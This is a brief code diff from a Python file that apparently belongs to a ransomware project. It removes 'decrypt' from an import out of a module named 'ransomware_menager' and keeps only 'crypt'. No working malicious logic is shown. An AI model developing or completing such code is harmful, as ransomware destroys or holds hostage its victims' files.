@@ -7,7 +7,7 @@
 import subprocess as command
 import os
 import re
-from ransomware_menager import crypt, decrypt
+from ransomware_menager import crypt
 
 
 def listDirectories(Dirpath):
